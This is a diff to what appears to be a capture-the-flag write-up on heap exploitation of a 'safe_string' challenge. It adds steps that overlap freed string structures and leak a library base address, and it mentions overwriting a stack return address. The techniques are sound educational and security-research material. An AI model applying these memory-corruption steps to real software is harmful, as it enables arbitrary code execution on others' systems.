@@ -65,12 +65,11 @@ So we can read and write in memory any where we want uptil
 memory region has the permission to read and write.
 
 
+## Overlapping pointers of struct 0 && string of struct 2 
 >   new.create_safe_string(0, 100, b"")
 >   new.create_safe_string(1, 100, b"")
->
 >   new.free_safe_string(0)
 >   new.free_safe_string(1)
->
 >   new.create_safe_string(2, 16, b"")
 
 
@@ -89,6 +88,16 @@ so we can jump from library offset to the stack offset
 We have to leak both stack local address and base address
 Stack local address will change as environment we need
 to leak to library pointers to stack
+
+
+## Leaking Library base
+>   new.create_safe_string(3, 2000, b"")
+>   new.create_safe_string(4, 2000, b"")
+>   new.free_safe_string(3)
+>   new.free_safe_string(4)
+>   new.create_safe_string(5, 2000, b"")
+>   library_base = get_library_offset(new.read_safe_string(5))
+
 
 then we are good to go we will overwrite the stack
 return address with our address.
